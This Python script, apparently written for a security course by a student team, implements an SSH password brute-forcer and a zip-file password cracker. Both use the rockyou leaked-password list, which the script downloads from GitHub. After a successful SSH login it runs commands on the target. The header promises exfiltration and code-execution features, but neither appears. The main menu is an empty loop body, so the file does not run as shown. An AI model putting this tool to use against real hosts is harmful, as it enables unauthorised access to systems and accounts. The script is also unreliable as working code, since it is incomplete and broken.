#!/usr/bin/python3

# This script exists to document two functions we've already written in class- the network enumeration and port scanner, and the brute force attempter;
# it also serves to house two new options, a simulated exfiltration and an anomaly based code execution

# members of the team include Ian Bennett, Cody Juhl, Kevin Hoang, Brittany Powell, Juan Maldonado, and Marcus Nogueira. 
# primary author of this script is Ian Bennett

####################### 
##### IMPORTS #########
#######################

#!/usr/bin/python3

import getpass, gzip, os, paramiko, re, shutil, sys, tarfile, time, wget
from zipfile import ZipFile


#######################
# open function to get host IP from user
def getHost():
    # make host a global variable
    global host
    
    #open loop to cycle through error handling until valid IP input
    while True:
        host = input("Please provide an IP address to connect to: ") or "192.168.1.xx"
    
        #this error handling brought to you by GPT4
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', host):
            octets = host.split('.')
    
            if all(0 <= int(octet) < 256 for octet in octets):
                break
    
            else:
                print("Invalid IP address format. Please try again.")
    
        else:
            print("Invalid IP address format. Please try again.")

#######################
# open function to get username from user
def getUser():
    # make user a global variable
    global user
    
    # open a loop to cycle through error handling until valid username input
    while True:
        user = input("Please provide a username: ")
    
        if user.strip():
            break
    
        else:
            print("Username cannot be empty. Please try again.")

#######################
# open function to wget and unzip/untar the rockyou dictionary if needed
def download_password_file(url):

    # try to wget it
    try:
        gz_target = wget.download(url)
        tar_target = gz_target[:-3]

        # gunzip
        with gzip.open(gz_target, 'rb') as f_in:
            with open(tar_target, 'wb') as f_out:
                shutil.copyfileobj(f_in, f_out)

        # untar
        with tarfile.open(tar_target, "r:") as tar_ref:
            tar_ref.extractall()
            filename = tar_ref.getnames()[0]

        # send unzipped filename out for use
        return filename
    
    # error with download/extract
    except Exception as e:
        print(f"An error occurred while downloading or extracting rockyou: {e}")
        return None

#######################
# open function to convert .txt to py list of words
def read_password_file(filename):

    # empty list
    password_list = []
    
    # open the file and read one word/line at a time
    try:
        with open(filename, 'r') as F:
            for line in F:
                password_list.append(line.strip())

    # error handling
    except FileNotFoundError:
        print("File not found. Please check the file path and try again.")
    
    # error handling
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")
    
    # send word list out
    return password_list

#######################
# open function to retrieve dictionary from user input or wget rockyou from github
def passFile():
    filename = None  # Initialize filename to None
    
    # prompt for dictionary filename or download
    gate1 = input("Do you have a dictionary file (y) or do you need to download one (n)? ").lower()
    
    # download rockyou if user doesn't have one
    if gate1 == 'n':
        url = "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz"
        filename = download_password_file(url)
    
    # take user's dictionary filepath
    elif gate1 == 'y':
        filename = input("Enter the dictionary file path: ")
        if not os.path.isfile(filename):
            print("The file does not exist. Please check the path and try again.")
            return []
    
    # If filename is set and it is a file
    if filename and os.path.isfile(filename):
        # then call the func to generate list from file
        password_list = read_password_file(filename)
        return password_list
    else:
        print("No valid filename was provided or file does not exist.")
        return []

#######################
# open function for what to do on successful login to prove login for user
def execute_commands(ssh):
    commands = ["whoami", "ls -l", "uptime"]
    
    for command in commands:
        stdin, stdout, stderr = ssh.exec_command(command)
        time.sleep(3)
        output = stdout.read().decode()
        print("*~#~*" * 25)
        print(output)
    
    print("*~#~*" * 25)

#######################
# open function to attempt ssh login
def sshAttempt(host, user, password, port=22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # use variables from above
    try:
        print(f"attempting login with {user}/'{password}' at {host}:{port}")
        ssh.connect(host, port, user, password)
        
        # if able to login, then
        print(f"Success! Connected with password: {password}\n")

        # prove it
        time.sleep(2)
        execute_commands(ssh)

        return True

    # if not able to login, then say so
    except paramiko.AuthenticationException:
        print("Authentication Failed!\n")
        time.sleep(2)
        return False

    # eject button
    except KeyboardInterrupt:
        print("Operation cancelled by user.")
        return False

    # other error
    except Exception as e:
        print(f"An error occurred: {e}")
        time.sleep(2)
        return False

    # reset ssh
    finally:
        ssh.close()

#######################
# main brute force ssh function
def execSSH():
    getHost()
    getUser()

    gate2 = input("Do you know the password? y/n: ").lower()

    # user knows the login credentials (why use this script .. ?)
    if gate2 == 'y':

        # take creds
        password = getpass.getpass(prompt="Please provide a password: ")

        # log in
        sshAttempt(host, user, password)

    # user has chosen the hard way        
    elif gate2 == 'n':

        # pull in the password list
        password_list = passFile()

        # loop to iterate
        for password in password_list:

            # try to log in
            if sshAttempt(host, user, password):

                # if it works, close the script
                print("happy hunting")
                break

#######################
# cool little file selector to locate zipped files -next three functions. original draft from prompt engineering w gpt
# https://chat.openai.com/share/0446b349-68d2-4fcf-bf10-5a50563183d5
def is_zip_file(filename):
    return filename.endswith('.zip')

def list_directory_contents(directory):
    """List the contents of the given directory in alphabetical order."""
    print(f"\nContents of '{directory}':")
    contents = os.listdir(directory)
    contents.sort()  # Sort the contents alphabetically
    for i, content in enumerate(contents, 1):
        print(f"{i}. {content}")
    print()

def search_for_file():
    zFilename = None
    current_directory = os.getcwd()  # Start from the current working directory
    
    while True:
        input_path = input("Enter the base directory to start the search (e.g., /home/user/Downloads) or '.' for the current directory: ").strip()
        if input_path == '.':
            break  # Accept the current directory
        elif input_path == '..':
            # Navigate up one directory level
            current_directory = os.path.abspath(os.path.join(current_directory, input_path))
            break
        elif os.path.isdir(input_path):
            current_directory = os.path.abspath(input_path)  # Convert to absolute path
            break
        else:
            print("Invalid input. Please enter a non-empty valid directory path.")
  
    
    while True:
        list_directory_contents(current_directory)
        user_choice = input("Enter the number of the directory to navigate into, 'up' to go to the parent directory, 'manual' to enter a directory manually, 'cancel' to cancel the operation, or the name of the zip file if you see it: ").strip()

        if user_choice.isdigit():
            contents = os.listdir(current_directory)
            contents.sort()
            choice_index = int(user_choice) - 1
            if 0 <= choice_index < len(contents):
                selected_item = contents[choice_index]
                chosen_path = os.path.join(current_directory, selected_item)
                if os.path.isdir(chosen_path):
                    current_directory = chosen_path
                elif is_zip_file(selected_item):
                    zFilename = chosen_path
                    print(f"Zipped file '{selected_item}' selected.")
                    break
                else:
                    print("The selected item is not a directory or a zipped file. Please try again.")
            else:
                print("Invalid selection. Please try again.")
        
        elif user_choice == 'up':
            parent_directory = os.path.abspath(os.path.dirname(current_directory))
            if parent_directory == current_directory:
                print("You are at the root directory. Cannot go up.")
            else:
                current_directory = parent_directory
        
        elif user_choice == 'manual':
            manual_path = input("Enter the full path of the directory: ").strip()
            if os.path.isdir(manual_path):
                current_directory = os.path.abspath(manual_path)
            else:
                print("The entered directory does not exist. Please try again.")
        
        elif user_choice == 'cancel':
            print("Operation cancelled by user.")
            break

        elif is_zip_file(user_choice) and os.path.isfile(os.path.join(current_directory, user_choice)):
            zFilename = os.path.join(current_directory, user_choice)
            print(f"Zipped file '{user_choice}' selected.")
            break

        else:
            print("Invalid input. Please try again.")

    return zFilename

#######################
# open main function to brute force crack open zipped files
def zipAttempt(zFilename, password, outfile):
    try:
        print(f"Attempting to open {zFilename} with '{password}'")
        with ZipFile(zFilename) as zf:
            # Extract all the contents into the specified output directory
            zf.extractall(path=outfile, pwd=bytes(password,'utf-8'))
            # Get a list of the ZIP file contents
            zip_contents = zf.namelist()

        # Print the success message and list all extracted files with their paths
        print(f"Success! Unlocked with password: {password}. The following files have been extracted:")
        for file in zip_contents:
            print(f"- {file} extracted to {os.path.join(outfile, file)}")
        print()

        time.sleep(2)
        return True

    except RuntimeError as e:
        if 'Bad password' in str(e):
            print("Authentication Failed!\n")
        
        else:
            print(f"Runtime error occurred: {e}")
                
        return False

    except KeyboardInterrupt:
        print("Operation cancelled by user.")
        return False

    except Exception as e:
        print(f"An error occurred: {e}")
        return False

#######################
# unzip function
def execZip():
    # First, get the zFilename using the search_for_file function.
    zFilename = search_for_file()

    # Prompt for the output directory before attempting passwords
    outfile = input("Enter the output directory for the extracted files: ").strip()
    # Check if the output directory exists, if not, create it.
    if not os.path.exists(outfile):
        os.makedirs(outfile, exist_ok=True)

    gate2 = input("Do you know the password? y/n: ").lower()

    # user knows the login credentials
    if gate2 == 'y':
        # take creds
        password = getpass.getpass(prompt="Please provide a password: ")
        # attempt to unlock
        if zipAttempt(zFilename, password, outfile):  # Pass zFilename, password, and outfile
            # if it works, exit the script
            print("\n\nhappy hunting\n")
            sys.exit()
    # user has chosen the hard way
    elif gate2 == 'n':
        # pull in the password list
        password_list = passFile()
        # loop to iterate
        for password in password_list:
            # attempt to unlock
            if zipAttempt(zFilename, password, outfile):  # Pass zFilename, password, and outfile
                # if it works, exit the script
                print("\n\nhappy hunting\n")
                sys.exit()

#######################
                


#######################


#######################
                

#######################
                
###########################################################################################################
###########################################################################################################

def main_menu(): 
    while True:

###########################################################################################################

if __name__ == "__main__":
    main_menu()
